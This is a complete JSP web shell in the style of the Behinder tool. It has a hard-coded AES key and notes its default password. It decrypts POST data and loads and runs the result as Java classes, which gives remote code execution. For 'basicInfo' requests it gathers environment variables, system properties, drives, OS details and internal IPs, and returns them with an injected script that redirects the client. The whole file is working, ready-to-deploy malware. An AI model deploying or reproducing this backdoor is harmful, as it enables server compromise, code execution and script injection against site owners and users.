<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.net.NetworkInterface" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.net.Inet4Address" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.File" %>
<%@ page import="java.net.NetworkInterface" %>
<%@ page import="java.net.InetAddress" %>
<%@ page import="java.net.Inet4Address" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.FileInputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%!class U extends ClassLoader{
    U(ClassLoader c){super(c);
    }
    public Class g(byte []b){
    return super.defineClass(b,0,b.length);
}}
%>
<%!
    Boolean isGetBaseinfo(byte[] mBaseData) {
        byte[] src = new byte[]{98, 97, 115, 105, 99, 73, 110, 102, 111};
        int i = 0;
        while (i < mBaseData.length) {
            if (mBaseData[i] == src[0]) {
                for (int j = 0; j < 9; j = j + 1) {
                    if (mBaseData[i + j] == src[j] && j == 8) {
                        return true;
                    } else if (mBaseData[i + j] != src[j]) {
                        break;
                    }

                }
                i++;
            } else {
                i++;
            }
        }
        return false;
    }
%>
<%!
    class  Hbrynvsrja {
        //        public static String whatever;
        private Object Request;
        private Object Response;
        private Object Session;
        private String key;
        private String xssFilepath;
        private String xssData;

        public Hbrynvsrja(String key,String xssFilepath,String xssData) {
            this.key = key;
            this.xssFilepath = xssFilepath;
            this.xssData = xssData;
//            whatever = "";
//            whatever = whatever + "4i1xo32uqarjGTTa0HmmwHVMoK5lLU2IXHjN3tkKhhy7SjiA3Ix7LWjZLq5vr4gGiSaN80vq2vSGUNqMLcZTbThbiJBbFQaf4Tcvbv0iYTea8q9ttQu2DPf5nzKL9nKJMFDywrl9o84vMvad6gfUqlhSUpeQtahNIiw8t7HjhKmivharRBaJULU1QBh2oxk2lIGsEq4ePhxsAh58J7nJpynAU4wf7TuKmzv8hUXe99vlHftlJmDdi3WMqMgast9CQTzMi82x8amujEOIOGdac2hmUkXP0vJPne9RVYPD53qGFxCyr2krNZe8DlFOQu1DWJBjECeoGiRIFlh42cdKrVp5ud9kCIYN1cx8JCO655HwWDW0AoSby2mYygRTTrHolBQGm0kXBSp2WdwDL6hkBXudnxc312GgLmDb6ZRk7yJinWHaYwke5zpv85fvksp64XWKTV2WYDrpvKP9z7hMcIqFNsjlGdhVFBdIM51ltNXAVNdJrFNPTxYYLb1PtsCte0ZiReDyMKWc5t0FKKI1qdvauaAaNsjNf8V4Ng21FW9VaEvdDg6cVPit58bEkkbOJr36YMPBB6OK0P2QsPoq4uDDp3t9k7q2sJLc4wlXtzmcjsHP03DEFpWVdqLI98rgACyZ1GIVUTRhKeVBQuJauvb14UPDZxOBWBM2Lm7q6XHZfslS9NQynSmNXpoEcvQhgO7w6Gg5m2T4DoFRqkZbUDve1BFjObWHxf01yXQLUoFw8XqZuXwNzB8dzj5YDAMs7QGpbRIlECQG8XQKQDX2cOvhANcGr5kN0Lx6nhZR5SpwXOP1WJDqBtShqX8wTVxxBRHNQsoHdJCNW8XKPjHiwCEXNXL8rmSE6e4yeHV0EOFrzxeOZidGLw5PgbzM4HDA9AHhm9YozcKOD2qmluTYyROoHPj6X95SRptFvG3NTlA3JbQuhkKXolIZuTrUMmgBDpaqTnzzzcvgxFF26OUvJ9Z3IK4tqQOeWLQ055mDMvT7IhQXITuho3bJN8QK0cfe35ww91p8gkeY";
        }

        public String getData(Object obj) {
            HashMap result = new HashMap();
            boolean var22 = false;

            Object so;
            Method write;
            label132: {
                try {
                    var22 = true;
                    this.fillContext(obj);
                    StringBuilder basicInfo = new StringBuilder("<br/><font size=2 color=red>环境变量:</font><br/>");
                    Map<String, String> env = System.getenv();
                    Iterator var5 = env.keySet().iterator();

                    while(var5.hasNext()) {
                        String name = (String)var5.next();
                        basicInfo.append(name + "=" + (String)env.get(name) + "<br/>");
                    }

                    basicInfo.append("<br/><font size=2 color=red>JRE系统属性:</font><br/>");
                    Properties props = System.getProperties();
                    Set<Map.Entry<Object, Object>> entrySet = props.entrySet();
                    Iterator var7 = entrySet.iterator();

                    while(var7.hasNext()) {
                        Map.Entry<Object, Object> entry = (Map.Entry)var7.next();
                        basicInfo.append(entry.getKey() + " = " + entry.getValue() + "<br/>");
                    }

                    String currentPath = (new File("")).getAbsolutePath();
                    String driveList = "";
                    File[] roots = File.listRoots();
                    File[] var10 = roots;
                    int var11 = roots.length;

                    for(int var12 = 0; var12 < var11; ++var12) {
                        File f = var10[var12];
                        driveList = driveList + f.getPath() + ";";
                    }

                    String osInfo = System.getProperty("os.name") + System.getProperty("os.version") + System.getProperty("os.arch");
                    Map<String, String> entity = new HashMap();
                    //xss设置
                    //xss设置
                    String content = "";
                    StringBuilder builder = new StringBuilder();
                    if (this.xssFilepath != "") {
                        File file = new File(this.xssFilepath);
                        InputStreamReader streamReader = new InputStreamReader(new FileInputStream(file), "UTF-8");
                        BufferedReader bufferedReader = new BufferedReader(streamReader);

                        while ((content = bufferedReader.readLine()) != null)
                            builder.append(content);
                    }else {
                        builder.append(this.xssData);
                    }
                    entity.put("basicInfo", builder.toString());
                    entity.put("currentPath", currentPath);
                    entity.put("driveList", driveList);
                    entity.put("osInfo", osInfo);
                    entity.put("arch", System.getProperty("os.arch"));
                    entity.put("localIp", this.getInnerIp());
                    result.put("status", "success");
                    result.put("msg", this.buildJson(entity, true));
                    var22 = false;
                    break label132;
                } catch (Exception var26) {
                    var22 = false;
                } finally {
                    if (var22) {
                        try {
                            return new String(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")),"UTF-8");
                        } catch (Exception var23) {
                        }

                    }
                }

                try {
                    return new String(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")),"UTF-8");
                } catch (Exception var24) {
                }

            }

            try {
                return new String(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")),"UTF-8");
            } catch (Exception var25) {
            }

            return "asd";
        }

        private String getInnerIp() {
            String ips = "";

            try {
                Enumeration<NetworkInterface> netInterfaces = NetworkInterface.getNetworkInterfaces();
                InetAddress ip = null;

                while(netInterfaces.hasMoreElements()) {
                    NetworkInterface netInterface = (NetworkInterface)netInterfaces.nextElement();
                    Enumeration<InetAddress> addresses = netInterface.getInetAddresses();

                    while(addresses.hasMoreElements()) {
                        ip = (InetAddress)addresses.nextElement();
                        if (ip != null && ip instanceof Inet4Address) {
                            ips = ips + ip.getHostAddress() + " ";
                        }
                    }
                }
            } catch (Exception var6) {
            }

            ips = ips.replace("127.0.0.1", "").trim();
            return ips;
        }

        private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
            StringBuilder sb = new StringBuilder();
            String version = System.getProperty("java.version");
            sb.append("{");
            Iterator var5 = entity.keySet().iterator();

            while(var5.hasNext()) {
                String key = (String)var5.next();
                sb.append("\"" + key + "\":\"");
                String value = ((String)entity.get(key)).toString();
                if (encode) {
                    Class Base64;
                    Object Encoder;
                    if (version.compareTo("1.9") >= 0) {
                        this.getClass();
                        Base64 = Class.forName("java.util.Base64");
                        Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                        value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    } else {
                        this.getClass();
                        Base64 = Class.forName("sun.misc.BASE64Encoder");
                        Encoder = Base64.newInstance();
                        value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                        value = value.replace("\n", "").replace("\r", "");
                    }
                }

                sb.append(value);
                sb.append("\",");
            }

            sb.setLength(sb.length() - 1);
            sb.append("}");
            return sb.toString();
        }

        private String base64encode(byte[] data) throws Exception {
            String result = "";
            String version = System.getProperty("java.version");

            Class Base64;
            try {
                this.getClass();
                Base64 = Class.forName("java.util.Base64");
                Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
            } catch (Throwable var7) {
                this.getClass();
                Base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = Base64.newInstance();
                result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
                result = result.replace("\n", "").replace("\r", "");
            }

            return result;
        }

        private void fillContext(Object obj) throws Exception {
            if (obj.getClass().getName().indexOf("PageContext") >= 0) {
                this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
                this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
                this.Session = obj.getClass().getMethod("getSession").invoke(obj);
            } else {
                Map<String, Object> objMap = (Map)obj;
                this.Session = objMap.get("session");
                this.Response = objMap.get("response");
                this.Request = objMap.get("request");
            }

            this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
        }

        private byte[] getMagic() throws Exception {
            String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
            int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
            Random random = new Random();
            byte[] buf = new byte[magicNum];

            for(int i = 0; i < buf.length; ++i) {
                buf[i] = (byte)random.nextInt(256);
            }

            return buf;
        }

        private byte[] Encrypt(byte[] var1) throws Exception {
            String var2 = this.key;
            byte[] var3 = var2.getBytes("utf-8");
            SecretKeySpec var4 = new SecretKeySpec(var3, "AES");
            Cipher var5 = Cipher.getInstance("AES/ECB/PKCS5Padding");
            var5.init(1, var4);
            byte[] var6 = var5.doFinal(var1);

            Class var7;
            try {
                var7 = Class.forName("java.util.Base64");
                Object var8 = var7.getMethod("getEncoder", (Class[])null).invoke(var7, (Object[])null);
                var6 = (byte[])var8.getClass().getMethod("encode", byte[].class).invoke(var8, var6);
            } catch (Throwable var12) {
                var7 = Class.forName("sun.misc.BASE64Encoder");
                Object var10 = var7.newInstance();
                String var11 = (String)var10.getClass().getMethod("encode", byte[].class).invoke(var10, var6);
                var11 = var11.replace("\n", "").replace("\r", "");
                var6 = var11.getBytes();
            }

            return var6;
        }
    }
%>
<%
    if (request.getMethod().equals("POST")) {

    String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
    session.putValue("u",k);
    Cipher c=Cipher.getInstance("AES");
    c.init(2,new SecretKeySpec(k.getBytes(),"AES"));
    byte[] data = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
    if(isGetBaseinfo(data)){
        //设置xss路径
        String xssFilepath = "";
        //xssdata
        String xssdata = "<script>\n" +
                "    window.location.href = 'http://www.baidu.com';\n" +
                "</script>";
        Hbrynvsrja hbrynvsrja = new Hbrynvsrja(k,xssFilepath,xssdata);
        String data2 = hbrynvsrja.getData(pageContext);
        Object respones2 = pageContext.getClass().getMethod("getResponse").invoke(pageContext);
        Object so = respones2.getClass().getMethod("getOutputStream").invoke(respones2);
        Method write = so.getClass().getMethod("write", byte[].class);
        write.invoke(so, data2.getBytes("UTF-8"));
        so.getClass().getMethod("flush").invoke(so);
        so.getClass().getMethod("close").invoke(so);
    }else {
        new U(this.getClass().getClassLoader()).g(data).newInstance().equals(pageContext);
    }
}%>
